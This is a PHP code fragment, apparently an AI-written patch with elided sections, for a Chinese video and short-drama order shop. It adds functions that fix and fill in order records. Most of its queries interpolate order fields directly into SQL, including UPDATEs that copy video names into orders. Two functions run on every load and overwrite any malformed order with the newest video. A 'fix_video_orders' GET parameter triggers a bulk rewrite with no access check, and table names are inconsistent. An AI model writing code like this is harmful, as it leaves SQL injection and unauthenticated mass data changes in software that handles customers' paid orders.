        $cookiesid = $userrow['zid'];
    }else{
        if(isset($_COOKIE['cookiesid'])){
            $cookiesid = $_COOKIE['cookiesid'];
        }else{
            $cookiesid = md5(uniqid(mt_rand(), 1) . time());
            setcookie('cookiesid', $cookiesid, time()+3600*24*30, "/");
        }
    }
}

// 影视订单自动修正 input 字段
function autoFixVideoOrderInput(&$order, $DB) {
    if(isset($order['tid']) && $order['tid'] == -4) {
        $inputArr = explode('|', $order['input']);
        $vid = intval($inputArr[0]);
        $video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
        if(!$video) {
            // 如果 input 不是资源ID，尝试用订单ID查找资源
            $video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='{$order['id']}' LIMIT 1");
            if($video) {
                $vid = $video['id'];
            }
        }
        // 如果 input 不规范且能查到资源，则自动修正
        if($video && (count($inputArr) < 3 || !$vid)) {
            $order['input'] = $vid . '|点播|1';
            // 同步修正数据库
            $DB->exec("UPDATE shua_pay SET input='{$order['input']}' WHERE id='{$order['id']}'");
        }
    }
}
// ... existing code ...
// 在订单详情和订单列表查询后调用
if(isset($order)) autoFixVideoOrderInput($order, $DB);
if(isset($orderList) && is_array($orderList)) {
    foreach($orderList as &$o) autoFixVideoOrderInput($o, $DB);
}
// ... existing code ...

// ... existing code ...
// 统一订单资源封面和标题补全函数
function fillOrderResourceInfo(&$order, $DB) {
    if(isset($order['tid']) && $order['tid'] == -4) {
        // 影视订单
        $inputArr = explode('|', $order['input']);
        $vid = intval($inputArr[0]);
        ...
        if($video) {
            $order['img'] = $video['img'];
            $order['shopimg'] = $video['img'];
            $order['name'] = $video['name'];
            $order['desc'] = $video['desc'];
        }
    } else {
        // 普通订单
        $tool = $DB->getRow("SELECT * FROM shua_tools WHERE tid='{$order['tid']}' LIMIT 1");
        if($tool) {
            $order['img'] = $tool['shopimg'];
            $order['shopimg'] = $tool['shopimg'];
            $order['name'] = $tool['name'];
            $order['desc'] = $tool['desc'];
        }
    }
}
// ... existing code ...
...
if(isset($data) && is_array($data)) {
    foreach($data as &$order) fillOrderResourceInfo($order, $DB);
}
// 订单详情
if(isset($row) && is_array($row)) fillOrderResourceInfo($row, $DB);
// ... existing code ...

// ... existing code ...
// 在 case 'query' 和 case 'order' 处理前加自动修正逻辑
function autoFixAllVideoOrderInput($DB) {
    // 查所有 tid=-4 的订单
    $orders = $DB->query("SELECT id, input FROM shua_orders WHERE tid=-4");
    $video_ids = $DB->query("SELECT id FROM shua_videolist ORDER BY id DESC")->fetchAll(PDO::FETCH_COLUMN);
    $latest_vid = $video_ids ? $video_ids[0] : 1;
    foreach($orders as $order) {
        $inputArr = explode('|', $order['input']);
        $vid = intval($inputArr[0]);
        // input 不规范或资源不存在，自动修正
        if($vid<=0 || !in_array($vid, $video_ids) || count($inputArr)<3) {
            $new_input = $latest_vid . '|url|1';
            $DB->exec("UPDATE shua_orders SET input='{$new_input}' WHERE id='{$order['id']}'");
        }
    }
}
autoFixAllVideoOrderInput($DB);
// ... existing code ...

// ... existing code ...
// 历史影视订单批量补全 name/img 字段
function fixAllVideoOrderNameImg($DB) {
    $orders = $DB->query("SELECT id, input FROM shua_orders WHERE tid=-4");
    $video_ids = $DB->query("SELECT id FROM shua_videolist ORDER BY id DESC")->fetchAll(PDO::FETCH_COLUMN);
    $latest_video = $DB->getRow("SELECT * FROM shua_videolist ORDER BY id DESC LIMIT 1");
    foreach($orders as $order) {
        $inputArr = explode('|', $order['input']);
        $vid = intval($inputArr[0]);
        $video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
        if(!$video) $video = $latest_video;
        if($video) {
            $DB->exec("UPDATE shua_orders SET name='{$video['name']}', img='{$video['img']}' WHERE id='{$order['id']}'");
        }
    }
}
fixAllVideoOrderNameImg($DB);
// ... existing code ...

// ... existing code ...
// 历史影视订单批量修正脚本
if(isset($_GET['fix_video_orders'])){
    $orders = $DB->query("SELECT id, input, vid FROM shua_orders WHERE tid=-4");
    while($order = $orders->fetch()){
        ...
        if(!$video) continue;
        $input2 = '购买短剧播放';
        $input3 = (isset($inputArr[2]) && $inputArr[2]) ? $inputArr[2] : 'all';
        $new_input = $vid . '|play|' . $input3;
        $DB->exec("UPDATE shua_orders SET input='{$new_input}', vid='{$vid}', input2='{$input2}', input3='{$input3}' WHERE id='{$order['id']}'");
    }
    exit('历史影视订单批量修正完成');
}
// ... existing code ...
...
// ... existing code ...
// 在case 'payvideo'入口、价格计算、订单写入、processOrder2等关键节点调用monitor_log
// 例如：monitor_log('payvideo参数', $_POST);
// ... existing code ...
